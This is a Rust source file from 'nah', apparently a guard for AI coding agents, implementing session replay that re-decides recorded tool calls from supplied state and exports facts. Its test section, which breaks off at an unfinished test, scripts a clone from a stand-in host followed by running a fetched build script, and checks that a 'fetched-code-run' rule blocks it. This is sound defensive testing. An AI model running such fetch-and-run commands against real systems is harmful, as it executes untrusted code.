//! Session replay, `nah test --session FILE`: a recorded session's calls,
//! each decided by the production pipeline from the state the session file
//! supplies before it, with session memory applied as `dispatch.rs` applies
//! it, and each result settled as the post-call hook settles it. Nothing is
//! executed, the host's disk is never read, and the ledger lives in a
//! scratch folder removed when the replay ends. The output is the facts
//! export, `nah/session-facts/v2`: for every call, what Nah computed about
//! it, whether or not anything blocked, and every question the supplied
//! state could not answer; and, beside them, where the session first saw
//! each name the call uses (`names.rs`, from the record in
//! `session_memory::seen`), what its writes change (`edits.rs`) and which
//! of its deletes `rm` asks about first (`asks.rs`). The live hook computes
//! none of these, so a replay's `facts` stay comparable with the hook's own.

mod asks;
mod edits;
mod names;

use std::collections::BTreeSet;
use std::path::Path;
use std::sync::{Arc, Mutex};

use clap::ValueEnum;
use nah_proto::ctx::{AbsolutePath, Ctx};
use nah_proto::effinterp_proto::{self, content_digest};
use nah_proto::observation::{Observation, ObservationRequest, PathKind};
use nah_proto::runtime_protection::SelfProtectionProjection;
use nah_proto::tool::ToolCallInput;
use serde::Deserialize;
use serde_json::{Value, json};

use crate::code_input::CodeInput;
use crate::pipeline::DecisionResult;
use crate::runtime::Runtime;
use crate::save_then_run::SaveMode;
use crate::session_memory::seen::{Seen, Source};
use crate::session_memory::world::{DIGEST, MAX_HASHED_BYTES, TEXT, World};
use crate::session_memory::{self, Host};
use crate::supplied_state::{ContextFixture, DeclaredPath, ObservationFixture};

const SESSION_SCHEMA: &str = "nah/session/v2";
const FACTS_SCHEMA: &str = "nah/session-facts/v2";

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct SessionFile {
    schema: String,
    runtime: String,
    session_id: Option<String>,
    /// The events begin at the session's start. A file that does not
    /// leaves every name whose sightings could have come earlier
    /// unobserved.
    from_start: bool,
    context: ContextFixture,
    events: Vec<Event>,
}

#[derive(Deserialize)]
#[serde(tag = "type", rename_all = "snake_case", deny_unknown_fields)]
enum Event {
    UserPrompt {
        text: String,
    },
    ToolCall {
        id: Option<String>,
        #[serde(default)]
        agent: Option<String>,
        tool: String,
        input: Value,
        state: Box<ObservationFixture>,
    },
    ToolResult {
        id: String,
        outcome: Outcome,
        /// What the call returned to the model; absent where it was not
        /// recorded, which a call that did not run never has.
        #[serde(default)]
        output: Option<Value>,
        #[serde(default)]
        state: Option<Box<ObservationFixture>>,
    },
}

/// How a call ended, as its result reports it.
#[derive(Clone, Copy, Deserialize, serde::Serialize)]
#[serde(rename_all = "snake_case")]
enum Outcome {
    Succeeded,
    Failed,
    NotRun,
    Ended,
}

/// One question the supplied state could not answer.
#[derive(Clone, Eq, Ord, PartialEq, PartialOrd, serde::Serialize)]
pub(crate) struct Unobserved {
    question: &'static str,
    subject: String,
    by: &'static str,
}

type Log = Arc<Mutex<BTreeSet<Unobserved>>>;

fn note(log: &Log, question: &'static str, subject: &str, by: &'static str) {
    log.lock()
        .expect("the unobserved log is never poisoned")
        .insert(Unobserved {
            question,
            subject: subject.to_owned(),
            by,
        });
}

fn take(log: &Log) -> Vec<Unobserved> {
    std::mem::take(&mut *log.lock().expect("the unobserved log is never poisoned"))
        .into_iter()
        .collect()
}

/// Replays the session file `text` and returns its facts export.
pub(crate) fn replay(text: &str) -> Result<String, String> {
    // The ledger is storage, not world state: it lives here until the end.
    let scratch = tempfile::tempdir().map_err(|error| format!("no scratch folder: {error}"))?;
    replay_in(text, scratch.path())
}

/// Replays `text` with the session's ledger and record kept in `scratch`.
fn replay_in(text: &str, scratch: &Path) -> Result<String, String> {
    let session: SessionFile =
        serde_json::from_str(text).map_err(|error| format!("invalid session file: {error}"))?;
    if session.schema != SESSION_SCHEMA {
        return Err(format!(
            "invalid session file: schema is not `{SESSION_SCHEMA}`"
        ));
    }
    let runtime = Runtime::value_variants()
        .iter()
        .copied()
        .find(|runtime| runtime.cli_name() == session.runtime)
        .ok_or_else(|| {
            format!(
                "invalid session file: unknown runtime `{}`",
                session.runtime
            )
        })?;
    session.context.validate()?;
    for event in &session.events {
        match event {
            Event::ToolCall { state, .. }
            | Event::ToolResult {
                state: Some(state), ..
            } => {
                state
                    .validate()
                    .map_err(|error| format!("invalid session state: {error}"))?;
                if state.platform() != session.context.platform() {
                    return Err("invalid session state: its platform is not the context's".into());
                }
            }
            _ => {}
        }
    }
    let ctx = session.context.context()?;
    let replay = Replay {
        ctx: &ctx,
        protection: session.context.self_protection()?,
        mode: session.context.enforcement(),
        log: Log::default(),
    };
    let all_paused = replay.mode == nah_policy::EnforcementMode::AllPaused;
    let platform = crate::live_state::host_platform();
    let ledgers = AbsolutePath::new(platform, scratch.to_string_lossy())
        .map_err(|error| error.to_string())?;
    let session_id = session.session_id.filter(|id| !id.is_empty());
    let unavailable = |code| format!("the session record is {code}");
    let mut seen = Seen::new(
        &ledgers,
        platform,
        runtime.cli_name(),
        session_id.as_deref(),
    )
    .map_err(unavailable)?;
    if !session.from_start {
        seen.missed_start();
    }
    // The calls whose result the file records.
    let answered: BTreeSet<&str> = session
        .events
        .iter()
        .filter_map(|event| match event {
            Event::ToolResult { id, .. } => Some(id.as_str()),
            _ => None,
        })
        .collect();
    // Each named call's directory and agent, which its result's post-call
    // event repeats.
    let mut calls = std::collections::BTreeMap::new();
    // Each named call's event and the text its writes would leave in each
    // file, which its result's state confirms or not.
    let mut proposed = std::collections::BTreeMap::<&str, (u32, Written)>::new();
    let mut events = Vec::new();
    for (position, event) in session.events.iter().enumerate() {
        let at = u32::try_from(position).map_err(|_| "the session file has too many events")?;
        events.push(match event {
            Event::UserPrompt { text } => {
                seen.record(Source::UserPrompt, at, &[text]);
                json!({"event": position, "type": "user_prompt", "text": text})
            }
            Event::ToolCall {
                id,
                agent,
                tool,
                input,
                state,
            } => {
                if let Some(id) = id {
                    calls.insert(id.clone(), (state.cwd.clone(), agent.clone()));
                }
                let (facts, result) = replay.call(
                    runtime,
                    (tool, input),
                    state,
                    session_id.as_deref(),
                    id.as_deref().map(|id| (id, agent.as_deref())),
                    &ledgers,
                    all_paused,
                )?;
                let plan = result.effinterp().map(|analysis| analysis.plan());
                let world = Supplied {
                    state: Some(state),
                    log: &replay.log,
                };
                let (edits, written) = plan.map_or_else(Default::default, |plan| {
                    edits::edits(plan, &|path| world.prior(path))
                });
                // Where each name was first seen, from what came before this
                // call and the call's own input.
                let texts = strings(input);
                let texts: Vec<&str> = texts.iter().map(AsRef::as_ref).collect();
                let this_call = seen.hashes(&texts);
                // A folder's spellings and the links the state declares below it.
                let listing = |folder: &str| {
                    let entry = state.declared_path(folder)?;
                    let spellings = std::iter::once(entry.resolved).chain(entry.realpath);
                    Some((
                        spellings.map(str::to_owned).collect(),
                        entry.links.to_vec(),
                    ))
                };
                let mut names = plan
                    .map(|plan| {
                        names::names(plan, ctx.home().as_str(), &listing, state.platform())
                    })
                    .unwrap_or_default();
                for name in &mut names {
                    name.first_seen = Some(seen.first_seen(&name.terms, at, &this_call));
                }
                seen.record(Source::ToolCall, at, &texts);
                if result.core().verdict() == nah_proto::decision::Verdict::Delegate {
                    // Text a file already held before the call is not the
                    // call's to write.
                    let written = written
                        .into_iter()
                        .filter(|(path, text)| {
                            !matches!(world.prior(path), edits::Prior::Known(held) if held.contains(text.as_str()))
                        })
                        .collect();
                    match id.as_deref().filter(|id| answered.contains(id)) {
                        Some(id) => {
                            proposed.insert(id, (at, written));
                        }
                        None => seen.missed_output_of(at),
                    }
                }
                json!({
                    "event": position,
                    "type": "tool_call",
                    "id": id,
                    "agent": agent,
                    "tool": tool,
                    "facts": facts,
                    "names": names,
                    "edits": edits,
                    "asks": plan.map(|plan| asks::asks(plan, ctx.home().as_str(), &|file| match world.prior(file) {
                        edits::Prior::Known(text) => Some(text),
                        _ => None,
                    })).unwrap_or_default(),
                })
            }
            Event::ToolResult {
                id,
                outcome,
                output,
                state,
            } => {
                let world = Supplied {
                    state: state.as_deref(),
                    log: &replay.log,
                };
                // The post-call hook's event in Claude Code's shape, which
                // every adapter hands session memory.
                let name = match outcome {
                    Outcome::Succeeded | Outcome::Ended => "PostToolUse",
                    Outcome::Failed => "PostToolUseFailure",
                    Outcome::NotRun => "PostToolBatch",
                };
                let (cwd, agent) = calls.get(id).cloned().unwrap_or_default();
                let texts = output.as_ref().map(strings);
                match &texts {
                    Some(texts) => {
                        let texts: Vec<&str> = texts.iter().map(AsRef::as_ref).collect();
                        seen.record(Source::ToolOutput, at, &texts);
                    }
                    None if !matches!(outcome, Outcome::NotRun) => seen.missed_output_at(at),
                    None => {}
                }
                // What the call wrote counts only where the state after it
                // shows the file holding it, at the call's own event; a
                // proposal nothing confirms stays the call's input.
                if let Some((event, written)) = proposed.remove(id.as_str())
                    && !matches!(outcome, Outcome::NotRun)
                {
                    let confirmed: Vec<&str> = written
                        .iter()
                        .filter(|(path, text)| {
                            matches!(world.prior(path), edits::Prior::Known(held) if held.contains(text.as_str()))
                        })
                        .map(|(_, text)| text.as_str())
                        .collect();
                    seen.record(Source::WrittenFile, event, &confirmed);
                }
                let event = json!({
                    "hook_event_name": name,
                    "session_id": session_id,
                    "cwd": cwd,
                    "tool_use_id": id,
                    "agent_id": agent,
                });
                let recorded = if all_paused {
                    Vec::new()
                } else {
                    session_memory::post_call::settle_in(
                        &event, runtime, &ledgers, platform, &world,
                    )
                };
                let mut value = json!({
                    "event": position,
                    "type": "tool_result",
                    "id": id,
                    "outcome": outcome,
                });
                if let Some(output) = output {
                    value["output"] = output.clone();
                }
                value["settlement"] = json!({
                    "recorded": recorded,
                    "unobserved": take(&replay.log),
                });
                value
            }
        });
    }
    seen.save().map_err(unavailable)?;
    let export = json!({
        "schema": FACTS_SCHEMA,
        "session": {
            "schema": SESSION_SCHEMA,
            "runtime": runtime.cli_name(),
            "session_id": session_id,
            "from_start": session.from_start,
        },
        "events": events,
    });
    let mut output = serde_json::to_string_pretty(&export)
        .map_err(|error| format!("facts export failed: {error}"))?;
    output.push('\n');
    Ok(output)
}

/// The text a call's writes would leave, each with the file it goes to.
type Written = Vec<(String, String)>;

/// What every call of one replay shares.
struct Replay<'a> {
    ctx: &'a Ctx,
    protection: SelfProtectionProjection,
    mode: nah_policy::EnforcementMode,
    log: Log,
}

impl Replay<'_> {
    /// Decides one call as the live hook does and returns its facts and its
    /// decision with session memory applied.
    #[allow(clippy::too_many_arguments)]
    fn call(
        &self,
        runtime: Runtime,
        (tool, arguments): (&str, &Value),
        state: &ObservationFixture,
        session_id: Option<&str>,
        call: Option<(&str, Option<&str>)>,
        ledgers: &AbsolutePath,
        all_paused: bool,
    ) -> Result<(Value, DecisionResult), String> {
        let (inputs, code) =
            crate::commands::runtime_tool_call(runtime, tool, arguments.clone(), &state.cwd)
                .map_err(|error| format!("{} rejects a tool call: {error}", runtime.cli_name()))?;
        // Every adapter lowers a call to one input.
        let input = inputs
            .into_iter()
            .next()
            .expect("a tool call lowers to an input")
            .with_project_dirs(state.project_dirs.clone())
            .with_session(session_id.map(str::to_owned));
        let world = Supplied {
            state: Some(state),
            log: &self.log,
        };
        // The shell the hook found in its environment, as the state records it.
        let input = input.with_shell(runtime.command_shell(
            state.platform() == nah_proto::ctx::Platform::Windows,
            |name| world.env(name),
        ));
        // What choosing the shell asked, which every verdict rests on.
        let shell = self
            .log
            .lock()
            .expect("the unobserved log is never poisoned")
            .clone();
        let mut result = self.decide(&input, code.as_ref(), state, SaveMode::of(Some(runtime)));
        let matched_rules = matched_rules(&result);
        let decide_shell = |input: &ToolCallInput| {
            self.decide(
                input,
                None,
                state,
                SaveMode::withheld(Some(Runtime::Claude)),
            )
        };
        let host = Host {
            ctx: self.ctx,
            ledgers,
            ledgers_platform: crate::live_state::host_platform(),
            world: &world,
            decide_shell: &decide_shell,
            call,
        };
        // Antigravity's adapter leaves a call with no id out of session
        // memory, since no post-call event will name it.
        let unfollowed = runtime == Runtime::Antigravity && call.is_none();
        let applied = session_memory::apply(
            &input,
            runtime,
            &host,
            &mut result,
            all_paused || unfollowed,
        );
        let facts = call_facts(&result, &matched_rules, &applied, take(&self.log), &shell);
        Ok((facts, result))
    }

    /// One decision from `state`, noting what it asked that `state` does
    /// not declare.
    fn decide(
        &self,
        input: &ToolCallInput,
        code: Option<&CodeInput>,
        state: &ObservationFixture,
        saves: SaveMode,
    ) -> DecisionResult {
        let sources = match state.sources() {
            Ok(sources) => sources,
            Err(error) => {
                note(&self.log, "source", &error, "decision");
                return crate::pipeline::failed_delegate(
                    "session-replay",
                    "state",
                    "the supplied state could not serve sources",
                );
            }
        };
        let observations: Arc<dyn crate::ObservationResolver> = Arc::new(Noting {
            inner: state.observations(),
            log: self.log.clone(),
        });
        let result = crate::pipeline::decide_supplied(
            input,
            code,
            self.ctx,
            &self.protection,
            self.mode,
            saves,
            &sources,
            observations,
            |request: &ObservationRequest| -> Result<Observation, String> {
                let observation = state.observation(request).inspect_err(|error| {
                    note(&self.log, "observation", error, "decision");
                })?;
                // A query the state answers only as unavailable, such as Git
                // state for pathspecs it does not declare, is unobserved too.
                for fact in observation.facts() {
                    if failed(&serde_json::to_value(fact.value()).unwrap_or_default()) {
                        let query = serde_json::to_string(fact.query()).unwrap_or_default();
                        note(&self.log, "observation", &query, "decision");
                    }
                }
                Ok(observation)
            },
        );
        use crate::SourceProvider;
        for observed in sources.observations() {
            // A file the state declares without its bytes was not read
            // either; a missing one or a folder is a fact.
            if let nah_effinterp::SourceObservation::Unavailable { demanded, .. } = observed
                && state.declared_path(&demanded).is_none_or(|entry| {
                    entry.kind == PathKind::File && entry.contents.is_none() && !entry.oversize
                })
            {
                note(&self.log, "source", &demanded, "decision");
            }
        }
        result
    }
}

/// One call's facts as the export states them, from its decision with
/// session memory applied (`applied`), the rules whose parts matched before
/// it, what the state could not answer, and which of that choosing the
/// call's shell asked (`shell`).
pub(crate) fn call_facts(
    result: &DecisionResult,
    matched_rules: &[&str],
    applied: &session_memory::Applied,
    unobserved: Vec<Unobserved>,
    shell: &BTreeSet<Unobserved>,
) -> Value {
    let (call_facts, ledger) = applied.export();
    let analysis = result.effinterp();
    let rested_on = rested_on(result, applied, &unobserved, shell);
    json!({
        "decision": result.core(),
        "matched_rules": matched_rules,
        "session_rule": applied.rule,
        "saves": result.save_rules(),
        "failures": result.failures().iter().map(|failure| json!({
            "source": failure.source(),
            "component": failure.component(),
            "code": failure.code(),
        })).collect::<Vec<_>>(),
        "plan": analysis.map(|analysis| analysis.plan()),
        "annotations": analysis.map_or(&[][..], |analysis| analysis.annotations()),
        "call_facts": call_facts,
        "ledger": ledger,
        "unobserved": unobserved,
        "rested_on": rested_on,
    })
}

/// Which of the call's unobserved questions its verdict rested on, by
/// position in `unobserved`: those the step that reached the verdict
/// followed (`unobserved`), whether that is all of them (`complete`), and
/// so whether the verdict is open to change had they been answered
/// (`open`: `true`, `false`, or `"unknown"` where the step cannot say).
///
/// A shell command is planned in the shell choosing it asked about; a plan
/// of anything else never reads that choice. A session rule's block names
/// the rest (`session_memory::Basis`); a
/// decision the guards reached says what it rested on only when it
/// delegated because the plan could not read a source the state left out.
/// Session memory blocks only a call the guards delegated, so its own
/// questions never decide one they blocked.
fn rested_on(
    result: &DecisionResult,
    applied: &session_memory::Applied,
    unobserved: &[Unobserved],
    shell: &BTreeSet<Unobserved>,
) -> Value {
    let positions = |test: &dyn Fn(&Unobserved) -> bool| -> BTreeSet<usize> {
        unobserved
            .iter()
            .enumerate()
            .filter(|(_, entry)| test(entry))
            .map(|(position, _)| position)
            .collect()
    };
    let choosing = positions(&|entry| shell.contains(entry));
    // `None` without a plan, which cannot say what it read.
    let in_shell = result.effinterp().map(|analysis| {
        matches!(
            analysis.plan().subject,
            effinterp_proto::Subject::Shell { .. }
        )
    });
    let (mut used, unread_choice) = match in_shell {
        Some(true) => (choosing, BTreeSet::new()),
        Some(false) => (BTreeSet::new(), choosing),
        None => Default::default(),
    };
    let complete = match (applied.rule, &applied.rested_on) {
        (Some(_), Some(basis)) => {
            used.extend(positions(&|entry| {
                basis.iter().any(|basis| answers(entry, basis))
            }));
            true
        }
        (Some(_), None) => false,
        (None, _) if result.core().verdict() == nah_proto::decision::Verdict::Block => {
            positions(&|entry| entry.by == "decision" && !shell.contains(entry)).is_empty()
        }
        (None, _) => {
            // A plan that could not read a source the state left out is
            // partial there, and a delegate for partial coverage rests on it.
            let unread: Vec<&str> = result
                .effinterp()
                .map(|analysis| analysis.plan())
                .filter(|_| result.core().coverage() == nah_proto::action::Coverage::Partial)
                .into_iter()
                .flat_map(|plan| &plan.boundaries)
                .filter_map(|boundary| match &boundary.affected_resource {
                    Some(effinterp_proto::ResourceExpr::Concrete {
                        identity: effinterp_proto::ResourceIdentity::FsPath { path },
                    }) => Some(path.as_str()),
                    _ => None,
                })
                .collect();
            used.extend(positions(&|entry| {
                entry.by == "decision"
                    && matches!(entry.question, "source" | "path")
                    && unread.contains(&entry.subject.as_str())
            }));
            false
        }
    };
    // Where every question is followed or never read, there is no other.
    let complete = complete || used.len() + unread_choice.len() == unobserved.len();
    let open = match (used.is_empty(), complete) {
        (false, _) => json!(true),
        (true, true) => json!(false),
        (true, false) => json!("unknown"),
    };
    json!({"unobserved": used, "complete": complete, "open": open})
}

/// Whether `entry` is the answer `basis` names: the world's answer to its
/// question, or which file a path names, which every question about the
/// path or a folder above it settles.
fn answers(entry: &Unobserved, basis: &session_memory::Basis) -> bool {
    match basis {
        session_memory::Basis::World { question, subject } => {
            entry.by == "session-memory" && entry.question == *question && entry.subject == *subject
        }
        session_memory::Basis::Path(path) => {
            matches!(entry.question, "path" | "followed" | "canonical" | "kind")
                && (entry.subject == *path
                    || path
                        .strip_prefix(entry.subject.as_str())
                        .is_some_and(|rest| rest.starts_with('/') || entry.subject.ends_with('/')))
        }
    }
}

/// Debug builds only: appends the value `record` makes, as one line, to the
/// file `NAH_DEBUG_FACTS` names, so a test can hold the live hook's facts to
/// a replay's. Release builds never look.
#[cfg(debug_assertions)]
pub(crate) fn debug_facts(record: impl FnOnce() -> Value) {
    use std::io::Write;
    let Some(path) = std::env::var_os("NAH_DEBUG_FACTS") else {
        return;
    };
    let mut line = record().to_string();
    line.push('\n');
    let _ = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)
        .and_then(|mut file| file.write_all(line.as_bytes()));
}

/// The text of a call's input or of its output: every string in `value`,
/// object keys included, and every number as JSON spells it.
fn strings(value: &Value) -> Vec<std::borrow::Cow<'_, str>> {
    match value {
        Value::String(text) => vec![text.into()],
        Value::Number(number) => vec![number.to_string().into()],
        Value::Array(items) => items.iter().flat_map(strings).collect(),
        Value::Object(map) => map
            .iter()
            .flat_map(|(key, value)| std::iter::once(key.into()).chain(strings(value)))
            .collect(),
        _ => Vec::new(),
    }
}

/// Whether an observed value, as JSON, says it could not be observed.
fn failed(value: &Value) -> bool {
    match value {
        Value::Object(map) => map
            .iter()
            .any(|(key, value)| key == "status" && value == "error" || failed(value)),
        Value::Array(items) => items.iter().any(failed),
        _ => false,
    }
}

/// The shipped rules whose parts matched, in evaluation order.
pub(crate) fn matched_rules(result: &DecisionResult) -> Vec<&'static str> {
    let definitions = crate::catalog::shipped_guards().definitions();
    let mut rules: Vec<&'static str> = Vec::new();
    for part in result.matched_parts() {
        let rule = definitions[*part].rule;
        if !rules.contains(&rule) {
            rules.push(rule);
        }
    }
    rules
}

/// The engine's observation resolver over supplied state, noting each path
/// it cannot answer.
struct Noting {
    inner: Arc<dyn crate::ObservationResolver>,
    log: Log,
}

impl crate::ObservationResolver for Noting {
    fn observe(
        &self,
        query: &effinterp_proto::ObservationQuery,
        budget: crate::ObservationBudget,
    ) -> effinterp_proto::ObservationOutcome {
        let outcome = self.inner.observe(query, budget);
        let (effinterp_proto::ObservationQuery::Path { path }
        | effinterp_proto::ObservationQuery::Listing { path, .. }) = query;
        match &outcome {
            effinterp_proto::ObservationOutcome::Refused(
                effinterp_proto::ObservationRefusal::Unobserved,
            ) => note(&self.log, "path", path, "decision"),
            // A declared path whose identity through its links, or what that
            // identity is, the state leaves out.
            effinterp_proto::ObservationOutcome::Path(fact)
                if matches!(
                    &fact.followed,
                    effinterp_proto::Fact::Unavailable(_)
                        | effinterp_proto::Fact::Known(effinterp_proto::PathTarget {
                            kind: effinterp_proto::Fact::Unavailable(_),
                            ..
                        })
                ) =>
            {
                note(&self.log, "followed", path, "decision");
            }
            _ => {}
        }
        outcome
    }
}

/// Session memory's world over one supplied state; `None` supplies
/// nothing. Each answer it cannot give is noted and answered as the live
/// read answers when it fails.
struct Supplied<'a> {
    state: Option<&'a ObservationFixture>,
    log: &'a Log,
}

impl Supplied<'_> {
    fn unobserved(&self, question: &'static str, subject: &str) {
        note(self.log, question, subject, "session-memory");
    }

    fn path(&self, path: &str) -> Option<DeclaredPath<'_>> {
        self.state?.declared_path(path)
    }

    /// The entry at `path`, with a link followed to what it reaches.
    fn target(&self, path: &str) -> Option<DeclaredPath<'_>> {
        let entry = self.path(path)?;
        match entry.kind {
            PathKind::Symlink => self.path(entry.realpath?),
            _ => Some(entry),
        }
    }

    /// What `path` held, as the edit facts read it.
    fn prior(&self, path: &str) -> edits::Prior {
        match self.target(path) {
            Some(DeclaredPath {
                kind: PathKind::Missing,
                ..
            }) => edits::Prior::Absent,
            Some(DeclaredPath {
                kind: PathKind::File,
                contents: Some(contents),
                ..
            }) => edits::Prior::Known(contents.to_owned()),
            _ => edits::Prior::Unobserved,
        }
    }

    /// The path below the top level of the repository that holds it.
    fn in_repository<'s>(
        &'s self,
        path: &str,
    ) -> Option<(crate::supplied_state::DeclaredRepository<'s>, String)> {
        let repository = self.state?.repository_holding(path)?;
        let relative = path
            .strip_prefix(repository.top_level)?
            .trim_start_matches('/')
            .to_owned();
        Some((repository, relative))
    }
}

impl World for Supplied<'_> {
    fn digest(&self, path: &str) -> Option<String> {
        let Some(entry) = self.target(path) else {
            self.unobserved(DIGEST, path);
            return None;
        };
        match (entry.kind, entry.contents) {
            (PathKind::File, Some(contents)) => (contents.len() as u64 <= MAX_HASHED_BYTES)
                .then(|| content_digest(contents.as_bytes())),
            (PathKind::File, None) => {
                self.unobserved(DIGEST, path);
                None
            }
            _ => None,
        }
    }

    fn text(&self, path: &str) -> Result<String, std::io::ErrorKind> {
        let Some(entry) = self.target(path) else {
            self.unobserved(TEXT, path);
            return Err(std::io::ErrorKind::Other);
        };
        match (entry.kind, entry.contents) {
            (PathKind::Missing, _) => Err(std::io::ErrorKind::NotFound),
            (PathKind::File, Some(contents)) => Ok(contents.to_owned()),
            (PathKind::File, None) => {
                self.unobserved(TEXT, path);
                Err(std::io::ErrorKind::Other)
            }
            _ => Err(std::io::ErrorKind::Other),
        }
    }

    fn canonical(&self, path: &str) -> String {
        let full = Path::new(path);
        // An undeclared ancestor passed on the way up may be a link.
        let mut passed = false;
        for ancestor in full.ancestors() {
            let Some(spelled) = ancestor.to_str().filter(|spelled| !spelled.is_empty()) else {
                continue;
            };
            match self.path(spelled) {
                // A missing path's recorded identity is the answer itself.
                Some(DeclaredPath {
                    kind: PathKind::Missing,
                    followed: Some(followed),
                    ..
                }) => {
                    if passed {
                        self.unobserved("canonical", path);
                    }
                    let rest = full.strip_prefix(ancestor).expect("an ancestor prefixes");
                    let resolved = Path::new(followed);
                    let resolved = if rest.as_os_str().is_empty() {
                        resolved.to_path_buf()
                    } else {
                        resolved.join(rest)
                    };
                    return resolved.to_string_lossy().into_owned();
                }
                Some(entry) if entry.kind != PathKind::Missing => {
                    if passed {
                        self.unobserved("canonical", path);
                    }
                    let resolved = Path::new(entry.realpath.unwrap_or(entry.resolved));
                    let rest = full.strip_prefix(ancestor).expect("an ancestor prefixes");
                    let resolved = if rest.as_os_str().is_empty() {
                        resolved.to_path_buf()
                    } else {
                        resolved.join(rest)
                    };
                    return resolved.to_string_lossy().into_owned();
                }
                Some(_) => {}
                None => passed = true,
            }
        }
        self.unobserved("canonical", path);
        path.to_owned()
    }

    fn is_dir(&self, path: &str) -> bool {
        match self.target(path) {
            Some(entry) => entry.kind == PathKind::Directory,
            None => {
                self.unobserved("kind", path);
                false
            }
        }
    }

    fn modified_ns(&self, path: &str) -> Option<u128> {
        let Some(entry) = self.target(path) else {
            self.unobserved("modified", path);
            return None;
        };
        if entry.kind == PathKind::Missing {
            return None;
        }
        if entry.modified_ns.is_none() {
            self.unobserved("modified", path);
        }
        entry.modified_ns.map(u128::from)
    }

    fn env(&self, name: &str) -> Option<String> {
        match self.state.and_then(|state| state.declared_env(name)) {
            Some(value) => value.map(str::to_owned),
            None => {
                self.unobserved("env", name);
                None
            }
        }
    }

    fn git_check_ignore(&self, _folder: &str, path: &str) -> Option<bool> {
        let Some((repository, relative)) = self.in_repository(path) else {
            self.unobserved("git-ignored", path);
            return None;
        };
        Some(repository.ignored.iter().any(|entry| {
            relative == entry.trim_end_matches('/')
                || entry.ends_with('/') && relative.starts_with(entry.as_str())
        }))
    }

    fn git_tracked(&self, _worktree: &str, path: &str) -> Option<bool> {
        let Some((index, relative)) = self
            .in_repository(path)
            .and_then(|(repository, relative)| Some((repository.index?, relative)))
        else {
            self.unobserved("git-tracked", path);
            return None;
        };
        let folder = format!("{relative}/");
        Some(
            index.contains_key(&relative)
                || index.keys().any(|tracked| tracked.starts_with(&folder)),
        )
    }

    fn index_holds_label(
        &self,
        _worktree: &str,
        path: &str,
        label_digests: &BTreeSet<String>,
    ) -> bool {
        let Some((repository, relative)) = self.in_repository(path) else {
            self.unobserved("git-index", path);
            return false;
        };
        let Some(index) = repository.index else {
            self.unobserved("git-index", path);
            return false;
        };
        let Some(staged) = index.get(&relative) else {
            return false;
        };
        match repository.head {
            Some(head) if head.get(&relative) == Some(staged) => return false,
            Some(_) => {}
            None => self.unobserved("git-index", path),
        }
        self.digest(path).as_ref() == Some(staged) || label_digests.contains(staged)
    }

    fn running_commands(&self) -> Option<String> {
        let commands = self.state.and_then(ObservationFixture::declared_processes);
        if commands.is_none() {
            self.unobserved("processes", "");
        }
        commands.map(|commands| commands.join("\n"))
    }

    fn crontab(&self) -> Option<String> {
        match self.state.and_then(ObservationFixture::declared_crontab) {
            Some(crontab) => Some(crontab.unwrap_or_default().to_owned()),
            None => {
                self.unobserved("crontab", "");
                None
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use serde_json::{Value, json};

    /// Every path lives under `/stand-in`, which no host has, so an answer
    /// the replay takes from the host's disk instead of the file shows.
    const WORK: &str = "/stand-in/work";
    const HOME: &str = "/stand-in/home";
    const TOKEN: &str = "ghp_0000000000000000000000000000standin";

    fn entry(path: &str, kind: &str) -> Value {
        let path = format!("{WORK}/{path}");
        let path = path.trim_end_matches('/');
        let mut entry =
            json!({"requested": path, "resolved": path, "kind": kind, "exists": kind != "missing"});
        if kind == "missing" {
            entry["followed"] = json!(path);
        } else {
            entry["realpath"] = json!(path);
            entry["modified_ns"] = json!(1);
        }
        entry
    }

    fn file(path: &str, contents: &str) -> Value {
        let mut entry = entry(path, "file");
        entry["contents"] = json!(contents);
        entry
    }

    /// The state around one call: the work folder, `paths` and the shell
    /// profiles, which are absent.
    fn state(paths: Vec<Value>) -> Value {
        let profiles = [
            ".bashrc",
            ".bash_profile",
            ".profile",
            ".zshrc",
            ".zshenv",
            ".zprofile",
            ".zlogin",
        ]
        .map(|name| {
            let path = format!("{HOME}/{name}");
            json!({"requested": path, "resolved": path, "kind": "missing", "exists": false})
        });
        json!({
            "platform": "linux",
            "cwd": WORK,
            "env": {"HOME": HOME, "PATH": null, "GITHUB_TOKEN": TOKEN},
            "paths": std::iter::once(entry("", "directory")).chain(paths).chain(profiles).collect::<Vec<_>>(),
            "roots": [{"kind": "project", "path": WORK}],
        })
    }

    fn bash(id: &str, command: &str, state: Value) -> Value {
        json!({"type": "tool_call", "id": id, "tool": "Bash", "input": {"command": command}, "state": state})
    }

    fn ran(id: &str, state: Value) -> Value {
        json!({"type": "tool_result", "id": id, "outcome": "succeeded", "state": state})
    }

    fn session(guard_settings: Value, events: Vec<Value>) -> String {
        json!({
            "schema": "nah/session/v2",
            "runtime": "claude",
            "session_id": "stand-in",
            "from_start": true,
            "context": {"platform": "linux", "home": HOME, "guard_settings": guard_settings},
            "events": events,
        })
        .to_string()
    }

    fn replay(guard_settings: Value, events: Vec<Value>) -> Vec<Value> {
        let printed = super::replay(&session(guard_settings, events)).unwrap();
        let export: Value = serde_json::from_str(&printed).unwrap();
        export["events"].as_array().unwrap().clone()
    }

    /// A fetched folder copied whole stays fetched where the file says the
    /// source is a folder, though the host has no such folder, and running
    /// code from the copy is blocked.
    #[test]
    fn a_copied_fetched_folder_is_judged_from_the_supplied_state() {
        let cloned = || vec![entry("origin", "directory"), entry("copy", "missing")];
        let copied = || {
            vec![
                entry("origin", "directory"),
                entry("copy", "directory"),
                file("copy/build.sh", "echo built\n"),
            ]
        };
        let events = replay(
            json!({"guards": {"untrusted-code": "strict"}, "rules": {}}),
            vec![
                bash(
                    "clone",
                    "git clone https://example.invalid/demo.git origin",
                    state(vec![entry("origin", "missing"), entry("copy", "missing")]),
                ),
                ran("clone", state(cloned())),
                bash("copy", "cp -R origin copy", state(cloned())),
                ran("copy", state(copied())),
                bash("run", "sh copy/build.sh", state(copied())),
            ],
        );
        let kept = &events[3]["settlement"]["recorded"][0]["kept"];
        assert!(
            kept.as_array()
                .unwrap()
                .iter()
                .any(|change| change["path"] == format!("{WORK}/copy") && change["tree"] == true),
            "{kept}"
        );
        assert_eq!(events[4]["facts"]["session_rule"], "fetched-code-run");
        assert_eq!(
            events[4]["facts"]["ledger"]["held"]["fetched"][format!("{WORK}/copy")]["tree"],
            true
        );
    }

    /// The ledger entries a rule used are exported however the call reached
    /// them: a glob selecting a labelled file, and a file holding labelled
    /// bytes under another name; and a call still in flight counts.
    #[test]
